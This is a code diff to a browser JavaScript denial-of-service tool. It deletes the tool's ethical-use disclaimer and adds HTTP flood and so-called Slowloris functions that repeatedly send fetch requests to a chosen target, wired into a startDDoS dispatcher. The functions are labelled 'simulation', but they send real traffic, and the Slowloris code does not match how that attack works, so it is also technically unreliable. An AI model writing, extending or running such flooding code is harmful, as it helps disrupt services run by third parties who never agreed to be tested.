@@ -1,25 +1,3 @@
-/**
- *  *********************************************************************
- *  ******************  ETHICAL HACKING TOOL  **************************
- *  *********************************************************************
- *
- *  WARNING: This tool is for SECURITY TESTING PURPOSES ONLY.
- *           Unauthorized use is ILLEGAL and can result in severe penalties.
- *
- *  DISCLAIMER: The developers of this tool are NOT responsible for any misuse
- *              or damage caused by its use. Use at your own risk.
- *
- *  By using this tool, you ACKNOWLEDGE and AGREE to the following:
- *
- *  1. You have explicit permission to perform security testing on the
- *     target system.
- *  2. You will NOT use this tool for any malicious or illegal activities.
- *  3. You understand the potential consequences of using this tool and
- *     accept full responsibility for your actions.
- *
- *  *********************************************************************
- */
-
 // Red and Black color scheme (using ANSI escape codes for terminal output)
 const RED = "\x1b[31m";
 const BLACK = "\x1b[30m";
@@ -220,6 +198,96 @@ async function udpFlood(target, durationSeconds) {
     log(RED + "UDP Flood attack simulation COMPLETED." + RESET);
 }
 
+// Function to add a HTTP flood attack
+async function httpFlood(target, durationSeconds) {
+    log(RED + "Starting HTTP Flood attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);
+
+    if (durationSeconds > MAX_DDOS_DURATION) {
+        log(RED + "Duration exceeds maximum allowed limit." + RESET);
+        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
+        return;
+    }
+
+    if (!await verifyPermissions(target)) {
+        return;
+    }
+
+    const startTime = Date.now();
+    let endTime = startTime + (durationSeconds * 1000);
+
+    while (Date.now() < endTime) {
+        try {
+            // Simulate sending an HTTP request
+            log("Sending HTTP request to: " + target);
+            fetch(target, {
+                method: 'GET',
+                keepalive: true,
+                mode: 'no-cors' //To allow requests to other domains
+            })
+                .then(response => {
+                    log(`Response received: ${response.status}`);
+                })
+                .catch(error => {
+                    log(RED + "Error sending request: " + error + RESET);
+                });
+
+            //Delay to simulate slowness.
+            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
+        } catch (error) {
+            log(RED + "Error during attack: " + error + RESET);
+        }
+    }
+
+    log(RED + "HTTP Flood attack simulation COMPLETED." + RESET);
+}
+
+// Function to add a Slowloris attack
+async function slowloris(target, durationSeconds) {
+    log(RED + "Starting Slowloris attack simulation on: " + target + " for " + durationSeconds + " seconds." + RESET);
+
+    if (durationSeconds > MAX_DDOS_DURATION) {
+        log(RED + "Duration exceeds maximum allowed limit." + RESET);
+        alert(RED + "Duration exceeds maximum allowed limit of " + MAX_DDOS_DURATION + " seconds." + RESET);
+        return;
+    }
+
+    if (!await verifyPermissions(target)) {
+        return;
+    }
+
+    const startTime = Date.now();
+    let endTime = startTime + (durationSeconds * 1000);
+
+    while (Date.now() < endTime) {
+        try {
+            // Simulate sending an incomplete HTTP request
+            log("Sending incomplete HTTP request to: " + target);
+            fetch(target, {
+                method: 'GET',
+                headers: {
+                    'X-Slowloris': 'StillProcessing...'
+                },
+                keepalive: true,
+                mode: 'no-cors' //To allow requests to other domains
+            })
+                .then(response => {
+                    log(`Response received: ${response.status}`);
+                })
+                .catch(error => {
+                    log(RED + "Error sending request: " + error + RESET);
+                });
+
+            //Delay to simulate slowness.
+            await new Promise(resolve => setTimeout(resolve, REQUEST_INTERVAL)); // Rate limiting
+        } catch (error) {
+            log(RED + "Error during attack: " + error + RESET);
+        }
+    }
+
+    log(RED + "Slowloris attack simulation COMPLETED." + RESET);
+}
+
+
 // Main execution function (call this from your HTML button)
 async function startDDoS(target, duration, attackType) {
     if (!target || !duration || !attackType) {
@@ -242,6 +310,12 @@ async function startDDoS(target, duration, attackType) {
                 break;
             case 'udpFlood':
                 udpFlood(actualTarget, duration);
+                break;
+            case 'httpFlood':
+                httpFlood(actualTarget, duration);
+                break;
+            case 'slowloris':
+                slowloris(actualTarget, duration);
                 break;
             default:
                 alert(RED + "Invalid attack type." + RESET);
